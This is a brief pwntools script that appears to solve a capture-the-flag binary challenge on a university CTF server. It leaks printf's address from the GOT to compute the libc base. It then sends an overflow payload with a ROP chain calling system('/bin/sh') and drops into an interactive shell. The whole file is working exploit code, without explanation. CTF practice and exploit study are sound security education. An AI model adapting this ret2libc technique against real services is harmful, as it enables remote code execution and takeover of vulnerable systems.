from pwn import *

#r = remote("127.0.0.1", 8888)
r = remote("ctf.adl.csie.ncu.edu.tw", 11006)
context.arch = "amd64"

r.recvuntil("decimal:")

printf_got = 0x601028
r.sendline(str(int(printf_got)))
r.recvuntil("is ")
printf_addr = int(r.recv(14).strip(), 16)

r.recvuntil("\n")
r.recv()

libc = printf_addr - 0x557b0
#libc = printf_addr - 0x55800
system_addr = libc + 0x45380
#system_addr = libc + 0x45390
sh = libc + 0x18c58b
#sh = libc + 0x11e70
pop_rdi = 0x0000000000400873


payload = "a" * 5 + "\x00" + "a" * 34
payload += flat([pop_rdi, sh, system_addr])
r.sendline(payload)

r.interactive()


